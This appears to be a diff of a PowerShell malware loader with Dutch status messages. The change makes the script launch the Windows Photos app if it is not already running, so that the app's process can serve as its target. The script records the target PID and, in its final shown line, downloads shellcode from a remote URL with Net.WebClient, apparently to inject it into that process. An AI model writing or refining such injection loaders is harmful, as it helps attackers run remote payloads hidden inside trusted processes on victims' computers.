@@ -9,15 +9,28 @@ Write-Host "[+] Zoeken naar proces..." -ForegroundColor Cyan
 $edgeProcesses = Get-Process -Name "photos" -ErrorAction SilentlyContinue
 
 if (-not $edgeProcesses) {
-    Write-Host "[-] Kon geen foto's proces starten/vinden!" -ForegroundColor Red
-    pause
-    exit
+    Write-Host "[*] Foto's-app niet gevonden, wordt gestart..." -ForegroundColor Yellow
+    Start-Process "ms-photos:"
+    $timeout = 10
+    $elapsed = 0
+    do {
+        Start-Sleep -Seconds 1
+        $elapsed++
+        $edgeProcesses = Get-Process -Name "photos" -ErrorAction SilentlyContinue
+    } while (-not $edgeProcesses -and $elapsed -lt $timeout)
+
+    if (-not $edgeProcesses) {
+        Write-Host "[-] Kon de Foto's-app niet starten!" -ForegroundColor Red
+        pause
+        exit
+    }
+
+    Write-Host "[+] Foto's-app succesvol gestart" -ForegroundColor Green
 }
 
 $targetProcess = $edgeProcesses | Select-Object -First 1
 $targetPID = $targetProcess.Id
-
-Write-Host "[+] Target foto's gevonden" -ForegroundColor Green
+Write-Host "[+] Target foto's gevonden (PID: $targetPID)" -ForegroundColor Green
 
 try {
     $shellcode = (New-Object Net.WebClient).DownloadData($url)
